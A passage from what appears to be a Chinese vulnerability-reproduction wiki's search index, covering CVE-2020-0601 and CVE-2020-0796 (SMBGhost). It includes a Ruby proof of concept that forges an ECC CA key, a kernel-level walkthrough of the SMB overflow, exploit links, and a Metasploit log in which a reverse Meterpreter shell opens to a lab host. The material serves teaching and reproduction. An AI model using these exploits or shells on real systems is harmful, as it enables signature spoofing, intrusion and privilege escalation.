\u5728\u6709\u6f0f\u6d1e\u7248\u672c\u7684crypt32.dll\u4e2d\u9a8c\u8bc1\u4f7f\u7528ECC\u7b97\u6cd5\u7b7e\u540d\u90e8\u5206\u7684\u51fd\u6570\u6070\u6070\u662f\u8fd9\u4e2a\u60c5\u51b5\uff0c\u539f\u5148\u7684\u51fd\u6570\u672a\u52a0\u53c2\u6570\u9a8c\u8bc1\uff0c\u53c2\u4e0e\u8ba1\u7b97\u7684\u57fa\u70b9G\u7684\u5185\u5bb9\u7531\u88ab\u9a8c\u8bc1\u7684\u8bc1\u4e66\u968f\u610f\u6307\u5b9a\uff0c\u4f7f\u672a\u6388\u6743\u7684\u8bc1\u4e66\u80fd\u591f\u6784\u5efa\u79c1\u94a5k=1\u7684\u7279\u6b8a\u89e3\u6765\u6210\u529f\u901a\u8fc7\u692d\u5706\u52a0\u5bc6\u7b97\u6cd5\u7684\u7b7e\u540d\u9a8c\u8bc1\u7684\u8fc7\u7a0b\u3002 \u8ba9\u6211\u4eec\u4ee5CVE-2020-0601\u7684\u4e00\u4e2aPOC\u4e3a\u4f8b\u6765\u89e3\u6790\u865a\u5047\u5bc6\u94a5\u7684\u6784\u5efa\u8fc7\u7a0b\uff1a require 'openssl' raw = File . read ARGV [ 0 ] # \u8bfb\u53d6\u4f7f\u7528ECC\u7b97\u6cd5\u7684\u8bc1\u4e66\u6587\u4ef6 ca = OpenSSL :: X509 :: Certificate . new ( raw ) # \u8bfb\u53d6\u4f7f\u7528ECC\u7b97\u6cd5\u7684\u8bc1\u4e66 ca_key = ca . public_key # \u4ece\u8bc1\u4e66\u4e2d\u63d0\u53d6\u516c\u94a5ca_key ca_key . private_key = 1 # \u8bbe\u7f6e\u79c1\u94a5\u4e3a1\uff0c\u4f7f\u5f97\u516c\u94a5K==1*\u57fa\u70b9G\u7684\u7b49\u5f0f\u6210\u7acb group = ca_key . group group . set_generator ( ca_key . public_key , group . order , group . cofactor ) group . asn1_flag = OpenSSL :: PKey :: EC :: EXPLICIT_CURVE ca_key . group = group # \u5229\u7528\u6784\u5efa\u7684\u5047\u57fa\u70b9G\u548c\u5047\u5bc6\u94a5k\u8bbe\u7f6e\u65b0group File . open ( \"spoofed_ca.key\" , 'w' ) { | f | f . write ca_key . to_pem } # \u5c06\u65b0\u7684group\u5199\u5165\u6587\u4ef6 \u4fee\u8865\u540e\u7684Crypt32.dll\u4e2d\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\u7b97\u6cd5\u7684\u51fd\u6570\u5df2\u52a0\u5165\u4e86\u53c2\u6570\u9a8c\u8bc1\u7684\u90e8\u5206\uff0c\u89e3\u51b3\u4e86\u7531\u81ea\u7531\u6307\u5b9a\u53c2\u6570G\u5bfc\u81f4\u7684\u6784\u9020\u7b2c\u4e8c\u4e2a\u7279\u6b8a\u7684\u6709\u6548\u5bc6\u94a5\u7684\u95ee\u9898\u3002 \u4e00\u5904\u9a8c\u8bc1\u673a\u5236\u7684\u5931\u8bef\u5bfc\u81f4\u4fe1\u4efb\u94fe\u7684\u8fde\u9501\u53cd\u5e94\u3002 \u73b0\u4ee3\u7684\u5b89\u5168\u7cfb\u7edf\u4e2d\u5b58\u5728\u7740\u201c\u4fe1\u4efb\u94fe\u201d\u7684\u6982\u5ff5\uff0c\u4fe1\u4efb\u94fe\u7684\u4e0a\u4e0b\u7ea7\u5b58\u5728\u4e00\u79cd\u7c7b\u4f3c\u5355\u5411\u62c5\u4fdd\u7684\u5173\u7cfb\uff0c\u5b50\u7ea7\u8bc1\u4e66\u7684\u53ef\u9760\u6027\u7531\u7b7e\u540d\u5176\u7684\u7236\u7ea7\u8bc1\u4e66\u62c5\u4fdd\u3002\u7b7e\u540d\u65f6\u7531\u6839\u8bc1\u4e66\u5f00\u59cb\u4e00\u7ea7\u7ea7\u5411\u4e0b\u7b7e\u540d\uff0c\u9a8c\u8bc1\u65f6\u5219\u9010\u5c42\u6eaf\u6e90\u9a8c\u8bc1\uff0c\u76f4\u5230\u627e\u5230\u4fe1\u4efb\u7684\u6839\u8bc1\u4e66\u6587\u4ef6\uff0c\u6784\u6210\u4e86\u4e00\u6761\u4fe1\u4efb\u94fe\u3002\u4f4d\u4e8e\u6574\u4e2a\u201c\u4fe1\u4efb\u94fe\u201d\u6700\u4e0a\u65b9\u7684\u662f\u6700\u4e3a\u91cd\u8981\u4e0d\u9700\u8981\u81ea\u8bc1\u8eab\u4efd\u7684\u6839\u8bc1\u4e66\u3002\u6839\u8bc1\u4e66\u4e00\u822c\u968f\u7cfb\u7edf\u9644\u5e26\u6216\u7531\u7ba1\u7406\u5458\u5b89\u88c5\u5728\u7cfb\u7edf\u5185\u3002 \u8fd9\u4e2a\u6f0f\u6d1e\u7684\u5b58\u5728\u5219\u4f7f\u5f97\u6784\u9020\u7684\u65e0\u6548\u7b7e\u540d\u901a\u8fc7\u4e86\u9a8c\u8bc1\u673a\u5236\uff0c\u4f7f\u672c\u5e94\u65ad\u88c2\u7684\u4fe1\u4efb\u94fe\u88ab\u5229\u7528\uff0c\u9010\u7ea7\u62c5\u4fdd\u7ee7\u7eed\u4e0b\u53bb\uff0c\u6700\u7ec8\u4f7f\u975e\u6cd5\u5185\u5bb9\u83b7\u5f97\u4e86\u8bc1\u4e66\u6240\u6709\u8005\u7684\u5408\u6cd5\u7b7e\u540d\u8eab\u4efd\u3002","title":"\u6f0f\u6d1e\u539f\u7406"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/Windows%20CryptoAPI%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E%20CVE-2020-0601/#\u6f0f\u6d1e\u5229\u7528","text":"https://github.com/ollypwn/CurveBall","title":"\u6f0f\u6d1e\u5229\u7528"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/Windows%20CryptoAPI%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E%20CVE-2020-0601/#\u53c2\u8003\u6587\u7ae0","text":"cve-2020-0601-windows-cryptoapi\u6b3a\u9a97\u6f0f\u6d1e\u5206\u6790","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/Windows%20SMB%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-0796/","text":"Windows SMB\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2020-0796 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 2020\u5e743\u670810\u65e5\uff0c\u5fae\u8f6f\u5728\u5176\u5b98\u65b9SRC\u53d1\u5e03\u4e86CVE-2020-0796\u7684\u5b89\u5168\u516c\u544a\uff08ADV200005\uff0cMicrosoftGuidance for Disabling SMBv3 Compression\uff09,\u516c\u544a\u8868\u793a\u5728Windows SMBv3\u7248\u672c\u7684\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u5b58\u5728\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u3002\u540c\u65f6\u6307\u51fa\u8be5\u6f0f\u6d1e\u5b58\u5728\u4e8eMicroSoft Server Message Block 3.1.1\u534f\u8bae\u5904\u7406\u7279\u5b9a\u8bf7\u6c42\u5305\u7684\u529f\u80fd\u4e2d\uff0c\u653b\u51fb\u8005\u5229\u7528\u8be5\u6f0f\u6d1e\u53ef\u5728\u76ee\u6807SMB Server\u6216\u8005Client\u4e2d\u6267\u884c\u4efb\u610f\u4ee3\u7801 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] SMB\u7248\u672c v3.1.1 Windows 10 Version 1903 for 32-bit Systems Windows 10 Version 1903 for x64-based Systems Windows 10 Version 1903 for ARM64-based Systems Windows Server, Version 1903 (Server Core installation) Windows 10 Version 1909 for 32-bit Systems Windows 10 Version 1909 for x64-based Systems Windows 10 Version 1909 for ARM64-based Systems Windows Server, Version 1909 (Server Core installation) \u73af\u5883\u642d\u5efa \u00b6 \u5728 MSDN \u4e0a\u4e0b\u8f7d\u5bf9\u5e94\u7684\u5b58\u5728\u6f0f\u6d1e\u7684\u7cfb\u7edf\u7248\u672c \u5b89\u88c5\u540e\u6267\u884c\u547d\u4ee4 winver \u67e5\u770b\u7cfb\u7edf\u7248\u672c\uff0c\u5e76\u67e5\u770b\u662f\u5426\u542b\u6709 KB4551762\u8865\u4e01 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6f0f\u6d1e\u539f\u7406 \u00b6 CVE-2020-0796\u6f0f\u6d1e\u5b58\u5728\u4e8e\u53d7\u5f71\u54cd\u7248\u672c\u7684Windows\u9a71\u52a8srv2.sys\u4e2d\u3002Windows SMB v3.1.1 \u7248\u672c\u589e\u52a0\u4e86\u5bf9\u538b\u7f29\u6570\u636e\u7684\u652f\u6301\u3002\u56fe2\u6240\u793a\u4e3a\u5e26\u538b\u7f29\u6570\u636e\u7684SMB\u6570\u636e\u62a5\u6587\u7684\u6784\u6210\u3002 ProtocolId\uff1a4\u5b57\u8282\uff0c\u56fa\u5b9a\u4e3a0x424D53FC OriginalComressedSegmentSize\uff1a4\u5b57\u8282\uff0c\u539f\u59cb\u7684\u672a\u538b\u7f29\u6570\u636e\u5927\u5c0f CompressionAlgorithm\uff1a2\u5b57\u8282\uff0c\u538b\u7f29\u7b97\u6cd5 Flags\uff1a2\u5b57\u8282\uff0c\u8be6\u89c1\u534f\u8bae\u6587\u6863 Offset/Length\uff1a\u6839\u636eFlags\u7684\u53d6\u503c\u4e3aOffset\u6216\u8005Length\uff0cOffset\u8868\u793a\u6570\u636e\u5305\u4e2d\u538b\u7f29\u6570\u636e\u76f8\u5bf9\u4e8e\u5f53\u524d\u7ed3\u6784\u7684\u504f\u79fb srv2.sys\u4e2d\u5904\u7406SMBv3\u538b\u7f29\u6570\u636e\u5305\u7684\u89e3\u538b\u51fd\u6570Srv2DecompressData\u672a\u4e25\u683c\u6821\u9a8c\u6570\u636e\u5305\u4e2dOriginalCompressedSegmentSize\u548cOffset/Length\u5b57\u6bb5\u7684\u5408\u6cd5\u6027\u3002\u800c\u8fd9\u4e24\u4e2a\u5b57\u6bb5\u5f71\u54cd\u4e86Srv2DecompressData\u4e2d\u5185\u5b58\u5206\u914d\u51fd\u6570SrvNetAllocateBuffer\u7684\u53c2\u6570\u3002\u5982\u56fe4\u6240\u793a\u7684Srv2DecompressData\u51fd\u6570\u53cd\u7f16\u8bd1\u4ee3\u7801\uff0cSrvNetAllocateBuffer\u5b9e\u9645\u7684\u53c2\u6570\u4e3aOriginalCompressedSegmentSize+Offset\u3002\u8fd9\u4e24\u4e2a\u53c2\u6570\u90fd\u76f4\u63a5\u6765\u6e90\u4e8e\u6570\u636e\u5305\u4e2dSMB Compression Transform Header\u4e2d\u7684\u5b57\u6bb5\uff0c\u800c\u51fd\u6570\u5e76\u672a\u5224\u65ad\u8fd9\u4e24\u4e2a\u5b57\u6bb5\u662f\u5426\u5408\u6cd5\uff0c\u5c31\u76f4\u63a5\u5c06\u5176\u76f8\u52a0\u540e\u4f5c\u4e3a\u5185\u5b58\u5206\u914d\u7684\u53c2\u6570(unsigned int\u7c7b\u578b\uff09\u3002 \u8fd9\u91cc\uff0cOriginalCompressedSegmentSize+Offset\u53ef\u80fd\u5c0f\u4e8e\u5b9e\u9645\u9700\u8981\u5206\u914d\u7684\u5185\u5b58\u5927\u5c0f\uff0c\u4ece\u800c\u5728\u540e\u7eed\u8c03\u7528\u89e3\u538b\u51fd\u6570SmbCompressionDecompress\u8fc7\u7a0b\u4e2d\u5b58\u5728\u8d8a\u754c\u8bfb\u53d6\u6216\u8005\u5199\u5165\u7684\u98ce\u9669\u3002 \u76ee\u524d\u5df2\u516c\u5f00\u7684\u9488\u5bf9\u8be5\u6f0f\u6d1e\u7684\u672c\u5730\u63d0\u6743\u5229\u7528\u5305\u542b\u5982\u4e0b\u7684\u4e3b\u8981\u8fc7\u7a0b\uff1a \uff081\uff09\u9a8c\u8bc1\u7a0b\u5e8f\u9996\u5148\u521b\u5efa\u5230SMS server\u7684\u4f1a\u8bdd\u8fde\u63a5\uff08\u8bb0\u4e3asession\uff09\u3002 \uff082\uff09\u9a8c\u8bc1\u7a0b\u5e8f\u83b7\u53d6\u81ea\u8eabtoken\u6570\u636e\u7ed3\u6784\u4e2dprivilege\u6210\u5458\u5728\u5185\u6838\u4e2d\u7684\u5730\u5740\uff08\u8bb0tokenAddr\uff09\u3002 \uff083\uff09\u9a8c\u8bc1\u7a0b\u5e8f\u901a\u8fc7session\u53d1\u9001\u7578\u5f62\u538b\u7f29\u6570\u636e\uff08\u8bb0\u4e3aevilData\uff09\u7ed9SMB server\u89e6\u53d1\u6f0f\u6d1e\u3002\u5176\u4e2d\uff0cevilData\u5305\u542btokenAddr\u3001\u6743\u9650\u6570\u636e\u3001\u6ea2\u51fa\u5360\u4f4d\u6570\u636e\u3002 \uff084\uff09 SMS server\u6536\u5230evilData\u540e\u89e6\u53d1\u6f0f\u6d1e\uff0c\u5e76\u4fee\u6539tokenAddr\u5730\u5740\u5904\u7684\u6743\u9650\u6570\u636e\uff0c\u4ece\u800c\u63d0\u5347\u9a8c\u8bc1\u7a0b\u5e8f\u7684\u6743\u9650\u3002 \uff085\uff09\u9a8c\u8bc1\u7a0b\u5e8f\u83b7\u53d6\u6743\u9650\u540e\u5bf9winlogon\u8fdb\u884c\u63a7\u5236\uff0c\u6765\u521b\u5efasystem\u7528\u6237shell\u3002 \u9996\u5148\uff0c\u770b\u4e00\u4e0b\u5df2\u516c\u5f00\u5229\u7528\u7684evilData\u6570\u636e\u5305 \u6570\u636e\u5305\u7684\u5185\u5bb9\u5f88\u7b80\u5355\uff0c\u5176\u4e2d\u51e0\u4e2a\u5173\u952e\u5b57\u6bb5\u6570\u636e\u5982\u4e0b\uff1a OriginalSize \uff1a0xffffffff Offset\uff1a0x10 Real compressed data \uff1a13\u5b57\u8282\u7684\u538b\u7f29\u6570\u636e\uff0c\u89e3\u538b\u540e\u5e94\u4e3a1108\u5b57\u8282\u2019A\u2019\u52a08\u5b57\u8282\u7684token\u5730\u5740\u3002 SMB3 raw data \uff1a\u5b9e\u9645\u4e0a\u662f\u75312\u4e2a8\u5b57\u8282\u76840x1FF2FFFFBC\uff08\u603b\u957f0x10)\u52a0\u4e0a0x13\u5b57\u8282\u7684\u538b\u7f29\u6570\u636e\u7ec4\u6210 \u4ece\u4e0a\u9762\u7684\u6f0f\u6d1e\u539f\u7406\u5206\u6790\u53ef\u77e5\uff0c\u6f0f\u6d1e\u6210\u56e0\u662fSrv2DecompressData\u51fd\u6570\u5bf9\u62a5\u6587\u5b57\u6bb5\u7f3a\u4e4f\u5408\u6cd5\u6027\u5224\u65ad\u9020\u6210\u5185\u5b58\u5206\u914d\u4e0d\u5f53\u3002\u5728\u8be5\u6f0f\u6d1e\u6570\u636e\u5305\u4e2d\uff0cOriginalSize \u662f\u4e00\u4e2a\u7578\u5f62\u503c\u3002OriginalSize+ Offset = 0xffffffff + 0x10 = 0xf \u662f\u4e00\u4e2a\u5f88\u5c0f\u7684\u503c\uff0c\u5176\u5c06\u4f1a\u4f20\u9012\u7ed9SrvNetAllocateBuffer\u8fdb\u884c\u8c03\u7528\uff0c\u4e0b\u9762\u5177\u4f53\u5206\u6790\u5185\u5b58\u5206\u914d\u60c5\u51b5\u3002SrvNetAllocateBuffer\u7684\u53cd\u7f16\u8bd1\u4ee3\u7801 \u7531\u4e8e\u4f20\u7ed9SrvNetAllocateBuffer\u7684\u53c2\u6570\u4e3a0xf\uff0c\u6839\u636eSrvNetAllocateBuffer\u7684\u5904\u7406\u6d41\u7a0b\u53ef\u77e5\uff0c\u8be5\u8bf7\u6c42\u5185\u5b58\u5c06\u4eceSrvNetBufferLookasides\u8868\u4e2d\u5206\u914d\u3002\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u53d8\u91cfSrvDisableNetBufferLookAsideList\u8ddf\u6ce8\u518c\u8868\u9879\u76f8\u5173\uff0c\u7cfb\u7edf\u9ed8\u8ba4\u72b6\u6001\u4e0bSrvDisableNetBufferLookAsideList\u4e3a0\u3002 SrvNetBufferLookasides\u8868\u901a\u8fc7\u51fd\u6570SrvNetCreateBuffer\u521d\u59cb\u5316\uff0c\u5b9e\u9645SrvNetCreateBuffer\u5faa\u73af\u8c03\u7528\u4e86SrvNetBufferLookasideAllocate\u5206\u914d\u5185\u5b58\uff0c\u8c03\u7528SrvNetBufferLookasideAllocate\u7684\u53c2\u6570\u5206\u522b\u4e3a[\u20180x1100\u2019, \u20180x2100\u2019, \u20180x4100\u2019, \u20180x8100\u2019, \u20180x10100\u2019, \u20180x20100\u2019, \u20180x40100\u2019, \u20180x80100\u2019, \u20180x100100\u2019]\u3002\u5728\u8fd9\u91cc\uff0c\u5185\u5b58\u5206\u914d\u53c2\u6570\u4e3a0xf\uff0c\u5bf9\u5e94\u7684lookaside\u8868\u4e3a0x1100\u5927\u5c0f\u7684\u8868\u9879\u3002 SrvNetBufferLookasideAllocate\u51fd\u6570\u5b9e\u9645\u662f\u8c03\u7528SrvNetAllocateBufferFromPool\u6765\u5206\u914d\u5185\u5b58 \u5728\u51fd\u6570SrvNetAllocateBufferFromPool\u4e2d\uff0c\u5bf9\u4e8e\u7528\u6237\u8bf7\u6c42\u7684\u5185\u5b58\u5206\u914d\u5927\u5c0f\uff0c\u5185\u90e8\u901a\u8fc7ExAllocatePoolWithTag\u51fd\u6570\u5206\u914d\u7684\u5185\u5b58\u5b9e\u9645\u8981\u5927\u4e8e\u8bf7\u6c42\u503c\uff08\u591a\u51fa\u90e8\u5206\u7528\u4e8e\u5b58\u50a8\u90e8\u5206\u5185\u5b58\u76f8\u5173\u6570\u636e\u7ed3\u6784\uff09\u3002\u4ee5\u8bf7\u6c42\u5206\u914d0x1100\u5927\u5c0f\u4e3a\u4f8b\uff0c\u7ecf\u8fc7\u4e00\u7cfb\u5217\u5224\u65ad\u540e\uff0c\u6700\u540e\u5206\u914d\u7684\u5185\u5b58\u5927\u5c0fallocate_size= 0x1100 + E8 + 2*(MmSizeOfMdl + 8)\u3002 \u5185\u5b58\u5206\u914d\u5b8c\u6bd5\u4e4b\u540e\uff0cSrvNetAllocateBufferFromPool\u51fd\u6570\u8fd8\u5bf9\u5206\u914d\u7684\u5185\u5b58\u8fdb\u884c\u4e86\u4e00\u7cfb\u5217\u521d\u59cb\u5316\u64cd\u4f5c\uff0c\u6700\u540e\u8fd4\u56de\u4e86\u4e00\u4e2a\u5185\u5b58\u4fe1\u606f\u7ed3\u6784\u4f53\u6307\u9488\u4f5c\u4e3a\u51fd\u6570\u7684\u8fd4\u56de\u503c\u3002 \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u5982\u4e0b\u7684\u6570\u636e\u5173\u7cfb\uff1aSrvNetAllocateBufferFromPool\u51fd\u6570\u8fd4\u56de\u503creturn_buffer\u6307\u5411\u4e00\u4e2a\u5185\u5b58\u6570\u636e\u7ed3\u6784\uff0c\u8be5\u5185\u5b58\u6570\u636e\u7ed3\u6784\u8d77\u59cb\u5730\u5740\u540c\u5b9e\u9645\u5206\u914d\u5185\u5b58\uff08\u51fd\u6570ExAllocatePoolWithTag\u5206\u914d\u7684\u5185\u5b58\uff09\u8d77\u59cb\u5730\u5740\u7684\u7684\u504f\u79fb\u4e3a0x1150\uff1breturn_buffer+0x18\u4f4d\u7f6e\u6307\u5411\u4e86\u5b9e\u9645\u5206\u914d\u5185\u5b58\u8d77\u59cb\u5730\u5740\u504f\u79fb0x50\u4f4d\u7f6e\u5904\uff0c\u800c\u6700\u7ec8return_buffer\u4f1a\u4f5c\u4e3a\u51fd\u6570SrvNetAllocateBuffer\u7684\u8fd4\u56de\u503c \u56de\u5230\u6f0f\u6d1e\u89e3\u538b\u51fd\u6570Srv2DecompressData\uff0c\u5728\u8fdb\u884c\u5185\u5b58\u5206\u914d\u4e4b\u540e\uff0cSrv2DecompressData\u8c03\u7528\u51fd\u6570SmbCompressionDecompress\u5f00\u59cb\u89e3\u538b\u88ab\u538b\u7f29\u7684\u6570\u636e \u5b9e\u9645\u4e0a\uff0c\u8be5\u51fd\u6570\u8c03\u7528\u4e86Windows\u5e93\u51fd\u6570RtlDecompressBufferEx2\u6765\u5b9e\u73b0\u89e3\u538b\uff0c\u6839\u636eRtlDecompressBufferEx2\u7684\u51fd\u6570\u539f\u578b\u6765\u5bf9\u5e94\u5206\u6790SmbCompressionDecompress\u51fd\u6570\u7684\u5404\u4e2a\u53c2\u6570\u3002 SmbCompressionDecompress(CompressAlgo\uff0c//\u538b\u7f29\u7b97\u6cd5 Compressed_buf\uff0c//\u6307\u5411\u6570\u636e\u5305\u4e2d\u7684\u538b\u7f29\u6570\u636e Compressed_size\uff0c//\u6570\u636e\u5305\u4e2d\u538b\u7f29\u6570\u636e\u5927\u5c0f\uff0c\u8ba1\u7b97\u5f97\u5230 UnCompressedBuf,//\u89e3\u538b\u540e\u7684\u6570\u636e\u5b58\u50a8\u5730\u5740\uff0c*(alloc_buffer+0x18)+0x10 UnCompressedSize,//\u538b\u7f29\u6570\u636e\u539f\u59cb\u5927\u5c0f,\u6e90\u4e8e\u6570\u636e\u5305OriginalCompressedSegmentSize FinalUnCompressedSize)//\u6700\u7ec8\u89e3\u538b\u540e\u6570\u636e\u5927\u5c0f \u4ece\u53cd\u7f16\u8bd1\u4ee3\u7801\u53ef\u4ee5\u770b\u51fa\uff0c\u51fd\u6570SmbCompressionDecompress\u4e2d\u4fdd\u5b58\u89e3\u538b\u540e\u6570\u636e\u7684\u5730\u5740\u4e3a*(alloc_buffer+0x18)+0x10\u7684\u4f4d\u7f6e\uff0c\u6839\u636e\u5185\u5b58\u5206\u914d\u8fc7\u7a0b\u5206\u6790\uff0calloc_buffer + 0x18\u6307\u5411\u4e86\u5b9e\u9645\u5185\u5b58\u5206\u914d\u8d77\u59cb\u4f4d\u7f6e\u504f\u79fb0x50\u5904\uff0c\u6240\u4ee5\u62f7\u8d1d\u76ee\u7684\u5730\u5740\u4e3a\u5b9e\u9645\u5185\u5b58\u5206\u914d\u8d77\u59cb\u5730\u5740\u504f\u79fb0x60\u4f4d\u7f6e\u5904\u3002 \u5728\u89e3\u538b\u8fc7\u7a0b\u4e2d\uff0c\u538b\u7f29\u6570\u636e\u89e3\u538b\u540e\u5c06\u5b58\u50a8\u5230\u8fd9\u4e2a\u5730\u5740\u6307\u5411\u7684\u5185\u5b58\u4e2d\u3002\u6839\u636eevilData\u6570\u636e\u7684\u6784\u9020\u8fc7\u7a0b\uff0c\u89e3\u538b\u540e\u7684\u6570\u636e\u4e3a\u5360\u5751\u6570\u636e\u548ctokenAddr\u3002\u62f7\u8d1d\u5230\u8be5\u5904\u5730\u5740\u540e\uff0ctokenAddr\u5c06\u8986\u76d6\u539f\u5185\u5b58\u6570\u636e\u7ed3\u6784\u4e2dalloc_buffer+0x18\u5904\u7684\u6570\u636e\u3002\u4e5f\u5c31\u662f\u89e3\u538b\u7f29\u51fd\u6570SmbCompressionDecompress\u8fd4\u56de\u540e\uff0calloc_buffer+0x18\u5c06\u6307\u5411\u9a8c\u8bc1\u7a0b\u5e8f\u7684tokenAddr\u5185\u6838\u5730\u5740 \u7ee7\u7eed\u770bSrv2DecompressData\u7684\u540e\u7eed\u5904\u7406\u6d41\u7a0b\uff0c\u89e3\u538b\u6210\u529f\u540e\uff0c\u51fd\u6570\u5224\u65adoffset\u7684\u7ed3\u679c\u4e0d\u4e3a0\u3002\u4e0d\u4e3a0\u5219\u8fdb\u884c\u5185\u5b58\u79fb\u52a8\uff0c\u5185\u5b58\u62f7\u8d1d\u7684\u53c2\u6570\u5982\u4e0b\uff1a memmove(*(alloc_buffer+0x18)\uff0cSMB_payload\uff0coffset) \u6b64\u65f6alloc_buffer+0x18\u5df2\u7ecf\u6307\u5411\u9a8c\u8bc1\u7a0b\u5e8f\u7684tokenAddr\u5185\u6838\u5730\u5740\uff0c\u800cSMB_payload\u6b64\u65f6\u6307\u5411evilData\u4e2d\u7684\u6743\u9650\u6570\u636e\uff0coffset\u5219\u4e3a0x10\u3002\u56e0\u6b64\uff0c\u8fd9\u4e2a\u5185\u5b58\u79fb\u52a8\u5b8c\u6210\u540e\uff0c\u6743\u9650\u6570\u636e\u5c06\u5199\u5165tokenAddr\u5904\u3002\u8fd9\u610f\u5473\u7740\uff0cSMS Server\u6210\u529f\u4fee\u6539\u4e86\u9a8c\u8bc1\u7a0b\u5e8f\u7684\u6743\u9650\uff0c\u4ece\u800c\u5b9e\u73b0\u4e86\u9a8c\u8bc1\u7a0b\u5e8f\u7684\u63d0\u6743\uff01 \u8fd8\u6709\u4e00\u4e2a\u7ec6\u8282\u9700\u8981\u6ce8\u610f\uff0c\u5728\u89e3\u538b\u65f6\uff0cSrv2DecompressData\u51fd\u6570\u4f1a\u5224\u65ad\u5b9e\u9645\u7684\u89e3\u538b\u540e\u6570\u636e\u5927\u5c0fFinalUnCompressedSize\u662f\u5426\u548c\u6570\u636e\u5305\u4e2d\u539f\u59cb\u6570\u636e\u5927\u5c0fOriginalCompressedSegmentSize\u4e00\u81f4 \u6309\u7406\u6765\u8bf4\u5b9e\u9645\u89e3\u538b\u540e\u7684\u6570\u636e\u5927\u5c0f\u4e3a0x1100\uff0c\u4e0d\u7b49\u4e8e\u6570\u636e\u5305\u4e2d\u7684\u539f\u59cb\u538b\u7f29\u6570\u636e\u5927\u5c0f0xffffffff\uff0c\u8fd9\u91cc\u5e94\u8be5\u8fdb\u5165\u5230\u540e\u9762\u5185\u5b58\u91ca\u653e\u7684\u6d41\u7a0b\u3002\u7136\u800c\uff0c\u5b9e\u9645\u4e0a\u5728\u51fd\u6570SmbCompressionDecompress\u4e2d\uff0c\u8c03\u7528RtlDecompressBufferEx2\u6210\u529f\u540e\u4f1a\u76f4\u63a5\u5c06OriginalCompressedSegmentSize\u8d4b\u503c\u7ed9FinalUnCompressedSize\u3002\u8fd9\u4e5f\u662f\u8be5\u6f0f\u6d1e\u5173\u4e8e\u4efb\u610f\u5730\u5740\u5199\u5165\u6210\u529f\u7684\u5173\u952e\u4e4b\u4e00\u3002 CVE-2020-0796 \u76ee\u6807\u63a2\u6d4b(\u5947\u5b89\u4fe1) \u00b6 \u4f7f\u7528\u5947\u5b89\u4fe1\u7684\u6f0f\u6d1e\u626b\u63cf\u6765\u63a2\u6d4b \u5947\u5b89\u4fe1 CVE-2020-0796 \u626b\u63cf\u4e0b\u8f7d CVE-2020-0796 \u84dd\u5c4fEXP \u00b6 Github CVE-2020-0796 \u84dd\u5c4fEXP \u4e0b\u8f7d \u8fd0\u884c\u811a\u672c\u540e\u76ee\u6807\u6210\u529f\u84dd\u5c4f CVE-2020-0796 \u672c\u5730\u63d0\u6743EXP \u00b6 Github CVE-2020-0796 \u672c\u5730\u63d0\u6743EXP \u4e0b\u8f7d \u8fd0\u884c\u5e94\u7528\u7a0b\u5e8f\u540e\u5f39\u51facmd\u7a97\u53e3\u4e3a system\u6743\u9650 \u6216\u8005\u4f7f\u7528 MSF\u7684\u5185\u7f6eEXP windows/local/cve_2020_0796_smbghost \u6765\u672c\u5730\u63d0\u6743 msf6 exploit(multi/handler) > set lhost 192.168.142.19 lhost => 192.168.142.19 msf6 exploit(multi/handler) > exploit [*] Started reverse TCP handler on 192.168.142.19:4444 [*] Sending stage (200262 bytes) to 192.168.142.61 [*] Meterpreter session 2 opened (192.168.142.19:4444 -> 192.168.142.61:51757) at 2020-11-08 15:28:20 +0800 meterpreter > meterpreter > getuid Server username: DESKTOP-RL1VAD8\\wy meterpreter > background msf6 exploit(multi/handler) > search cve_2020 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/admin/sap/cve_2020_6287_ws_add_user 2020-07-14 normal Yes SAP Unauthenticated WebService User Creation 1 exploit/linux/misc/cve_2020_13160_anydesk 2020-06-16 normal Yes AnyDesk GUI Format String Write 2 exploit/windows/local/cve_2020_0668_service_tracing 2020-02-11 excellent No Service Tracing Privilege Elevation Vulnerability 3 exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move 2020-03-10 excellent Yes Background Intelligent Transfer Service Arbitrary File Move Privilege Elevation Vulnerability 4 exploit/windows/local/cve_2020_0796_smbghost 2020-03-13 good Yes SMBv3 Compression Buffer Overflow Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/local/cve_2020_0796_smbghost msf6 exploit(multi/handler) > use 4 [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp msf6 exploit(windows/local/cve_2020_0796_smbghost) > show options Module options (exploit/windows/local/cve_2020_0796_smbghost): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on. Payload options (windows/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 192.168.142.19 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Windows 10 v1903-1909 x64 msf6 exploit(windows/local/cve_2020_0796_smbghost) > set session 2 session => 2 msf6 exploit(windows/local/cve_2020_0796_smbghost) > check [*] The target appears to be vulnerable. msf6 